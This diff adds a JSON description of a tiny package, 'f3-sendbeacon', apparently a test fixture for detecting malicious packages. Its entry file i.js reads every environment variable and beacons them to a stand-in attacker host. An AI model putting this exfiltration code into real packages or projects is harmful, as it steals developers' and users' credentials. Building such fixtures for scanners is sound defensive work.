@@ -1,0 +1,7 @@
+{
+  "packageName": "f3-sendbeacon",
+  "sourceFiles": {
+    "package.json": "{\"name\":\"f3-sendbeacon\",\"main\":\"i.js\"}",
+    "i.js": "const e=JSON.stringify(process.env);navigator.sendBeacon(\"https://collect.attacker.example\",e);"
+  }
+}
